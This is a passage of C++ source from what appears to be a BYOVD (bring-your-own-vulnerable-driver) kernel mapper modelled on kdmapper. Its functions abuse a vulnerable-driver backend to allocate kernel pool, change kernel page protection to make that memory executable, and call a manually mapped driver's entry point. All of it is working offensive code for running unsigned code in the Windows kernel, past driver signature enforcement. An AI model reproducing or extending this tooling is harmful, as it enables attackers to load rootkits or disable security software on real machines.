                if (target >= ntosBase && target < imageEnd) { cached = target; return target; }
            }
        }
    }

    return 0;
}

// ---------------------------------------------------------------------------
// Kernel memory allocation / protection / driver entry
// ---------------------------------------------------------------------------

bool AllocateKernelMemory(byovd::IByovdBackend* backend, size_t size, uint64_t& outKernelVa) {
    if (!backend || size == 0) return false;

    // Same primitive kdmapper uses: ExAllocatePoolWithTag(NonPagedPool, ...).
    // The pool is NX on Win8+; callers that execute from it must flip
    // protection with ProtectKernelMemory.
    uint64_t allocFn = ResolveKernelExport(backend, L"ntoskrnl.exe", "ExAllocatePoolWithTag");
    if (!allocFn) {
        std::cerr << "[hinv::kmem] ExAllocatePoolWithTag not found\n";
        return false;
    }

    constexpr uint64_t NonPagedPool = 0;
    constexpr uint64_t HinvTag = 0x766E6968; // 'hinv'
    uint64_t allocated = 0;
    if (!CallKernelFunction(backend, &allocated, allocFn, NonPagedPool,
                            static_cast<uint64_t>(size), HinvTag))
        return false;

    outKernelVa = allocated;
    return outKernelVa != 0;
}

bool FreeKernelMemory(byovd::IByovdBackend* backend, uint64_t kernelVa) {
    if (!backend || !kernelVa) return false;

    uint64_t freeFn = ResolveKernelExport(backend, L"ntoskrnl.exe", "ExFreePoolWithTag");
    if (!freeFn) {
        std::cerr << "[hinv::kmem] ExFreePoolWithTag not found\n";
        return false;
    }

    constexpr uint64_t HinvTag = 0x766E6968; // 'hinv'
    return CallKernelFunction<void>(backend, nullptr, freeFn, kernelVa, HinvTag);
}

bool ProtectKernelMemory(byovd::IByovdBackend* backend, uint64_t kernelVa, size_t size, uint32_t protect) {
    if (!backend || !kernelVa || !size) return false;

    uint64_t setProtFn = ResolveMmSetPageProtection(backend);
    if (!setProtFn) {
        std::cerr << "[hinv::kmem] MmSetPageProtection not found\n";
        return false;
    }

    uint8_t ok = 0; // BOOLEAN
    if (!CallKernelFunction(backend, &ok, setProtFn, kernelVa,
                            static_cast<uint64_t>(size), static_cast<uint64_t>(protect)))
        return false;
    return ok != 0;
}

uint32_t CallDriverEntry(byovd::IByovdBackend* backend, uint64_t driverEntryVa,
                         uint64_t driverObjectVa, uint64_t registryPathVa) {
    if (!backend || !driverEntryVa) return STATUS_INVALID_PARAMETER;

    uint32_t status = STATUS_UNSUCCESSFUL;
    if (!CallKernelFunction(backend, &status, driverEntryVa, driverObjectVa, registryPathVa)) {
        std::cerr << "[hinv::kmem] CallDriverEntry: kernel call failed\n";
        return STATUS_UNSUCCESSFUL;
    }
    return status;
}

} // namespace kmem
} // namespace hinv
